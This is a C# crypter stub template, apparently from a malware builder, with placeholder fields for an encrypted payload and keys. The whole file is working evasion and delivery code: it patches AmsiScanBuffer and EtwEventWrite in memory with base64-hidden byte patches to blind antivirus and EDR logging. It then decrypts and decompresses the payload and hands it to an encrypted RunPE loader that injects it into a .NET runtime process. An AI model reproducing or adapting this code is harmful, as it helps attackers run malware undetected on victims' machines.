using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;


[assembly: AssemblyTitle("#AssemblyTitle#")]
[assembly: AssemblyDescription("#AssemblyDescriptions#")]
[assembly: AssemblyConfiguration("#AssemblyConfigurations#")]
[assembly: AssemblyCompany("#AssemblyCompany#")]
[assembly: AssemblyProduct("#AssemblyProduct#")]
[assembly: AssemblyCopyright("#AssemblyCopyright#")]
[assembly: AssemblyTrademark("#AssemblyTrademark#")]
[assembly: AssemblyVersion("999.998.997.996")]
[assembly: AssemblyFileVersion("999.998.997.996")]

namespace Stub
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            string passwordAesCompressStub = "#PASSWORD_AES_COMPRESS_STUB#";
            string payloadAesCompressStub = "#PAYLOAD_AES_COMPRESS_STUB#";

            ByPass.Edr();
            RunPe(Decompress(Decrypt(payloadAesCompressStub, passwordAesCompressStub)));
        }

        private static void RunPe(byte[] data)
        {
            string codeRunPe = "#CodeRunPE#";
            string passwordRunPe = "#PasswordRunPE#";
            string pathProcess = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "#PathProcess#");

            Assembly runpeLoader =
                Assembly.Load(Decompress(Decrypt(codeRunPe, passwordRunPe)));

            MethodInfo mi = runpeLoader.GetType("#NamespaceRunpe#.#ClassRunpe#").GetMethod("#MethodsRunPE#");
            object[] parameters = { pathProcess, data };
            mi.Invoke(null, parameters);
        }

        public static byte[] Decrypt(string encryptedText, string key)
        {
            byte[] encryptedBytes = Convert.FromBase64String(encryptedText);
            using (AesManaged aes256 = new AesManaged())
            {
                using (SHA256CryptoServiceProvider sha256Hash = new SHA256CryptoServiceProvider())
                {
                    byte[] hash = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(key));
                    aes256.KeySize = 256;
                    aes256.BlockSize = 128;
                    aes256.Key = hash.Take(aes256.KeySize / 8).ToArray();
                    aes256.IV = hash.Take(aes256.BlockSize / 8).ToArray();
                    aes256.Mode = CipherMode.CBC;
                    byte[] decryptedBytes;

                    using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes256.CreateDecryptor(),
                                   CryptoStreamMode.Read))
                        {
                            using (MemoryStream tempStream = new MemoryStream())
                            {
                                byte[] buffer = new byte[1024];
                                int read;
                                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                                {
                                    tempStream.Write(buffer, 0, read);
                                }

                                decryptedBytes = tempStream.ToArray();
                            }
                        }
                    }

                    return decryptedBytes;
                }
            }
        }

        public static byte[] Decompress(byte[] compressedData)
        {
            using (MemoryStream compressedStream = new MemoryStream(compressedData))
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
                    {
                        gzipStream.CopyTo(decompressedStream);
                    }

                    return decompressedStream.ToArray();
                }
            }
        }
    }
    public class ByPass : StringObf
    {
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
            string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        public static void Edr()
        {

            if (Is64Bit())
            {
                PatchMemory(DecodeBase64Str(NameDllAmsi()), DecodeBase64Str(FonctionDllAmsi()),
                    DecodeBase64Bytes(X64PatchSllAmsi()));
                PatchMemory(DecodeBase64Str(NameDllEtw()), DecodeBase64Str(FonctionDllEtw()),
                    DecodeBase64Bytes(X64PatchDllEtw()));
            }
            else if (!Is64Bit())
            {
                PatchMemory(DecodeBase64Str(NameDllAmsi()), DecodeBase64Str(FonctionDllAmsi()),
                    DecodeBase64Bytes(X86PatchSllAmsi()));
                PatchMemory(DecodeBase64Str(NameDllEtw()), DecodeBase64Str(FonctionDllEtw()),
                    DecodeBase64Bytes(X86PatchDllEtw()));
            }
        }

        private static void PatchMemory(string nameDll, string nameFonction, byte[] patch)
        {
            IntPtr library = LoadLibrary(nameDll);
            IntPtr procAddress = GetProcAddress(library, nameFonction);
            uint output;
            bool vProtect = VirtualProtect(procAddress, (UIntPtr)patch.Length, 0x40, out output);
            Marshal.Copy(patch, 0, procAddress, patch.Length);
        }

        private static bool Is64Bit()
        {
            if (IntPtr.Size == 8)
            {
                return true;
            }

            return false;
        }

        private static string DecodeBase64Str(string input)
        {
            return Encoding.ASCII.GetString(Convert.FromBase64String(input));
        }

        private static byte[] DecodeBase64Bytes(string input)
        {
            return Convert.FromBase64String(input);
        }
    }
    public class StringObf
    {
        private static string _key = new GenerateKey(256).GenerateStrenghCharacter();
        private static string Obfuscate(string input)
        {
            string obfuscationPattern = _key;
            var obfuscated = new StringBuilder();

            foreach (char c in input)
            {
                obfuscated.Append(obfuscationPattern + c + obfuscationPattern);
            }

            return obfuscated.ToString();
        }

        private static string Deobfuscate(string input)
        {
            string obfuscationPattern = _key;
            return input.Replace(obfuscationPattern, "");
        }

        public static string NameDllEtw()
        {
            return Deobfuscate(Obfuscate("bnRkbGwuZGxs"));
        }

        public static string FonctionDllEtw()
        {
            return Deobfuscate(Obfuscate("RXR3RXZlbnRXcml0ZQ=="));
        }

        public static string X64PatchDllEtw()
        {
            return Deobfuscate(Obfuscate("SDPAww=="));
        }

        public static string X86PatchDllEtw()
        {
            return Deobfuscate(Obfuscate("M8DCFAA="));
        }

        public static string NameDllAmsi()
        {
            return Deobfuscate(Obfuscate("YW1zaS5kbGw="));
        }

        public static string FonctionDllAmsi()
        {
            return Deobfuscate(Obfuscate("QW1zaVNjYW5CdWZmZXI="));
        }

        public static string X64PatchSllAmsi()
        {
            return Deobfuscate(Obfuscate("uFcAB4DD"));
        }

        public static string X86PatchSllAmsi()
        {
            return Deobfuscate(Obfuscate("uFcAB4DCGAA="));
        }
    }
    public class GenerateKey
    {
        public int SizeOfKey;

        public GenerateKey(int sizeOfKey)
        {
            this.SizeOfKey = sizeOfKey;
        }

        public string GenerateStrenghCharacter()
        {
            string abc = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789";
            string result = "";
            Random
                rnd = new Random(Guid.NewGuid()
                    .GetHashCode()); //Pour chaque fois que la fonction est appeller il y a une chaine de caractere different
            int iter = SizeOfKey;
            for (int i = 0; i < iter; i++)
                result += abc[rnd.Next(0, abc.Length)];
            return result;
        }
    }
}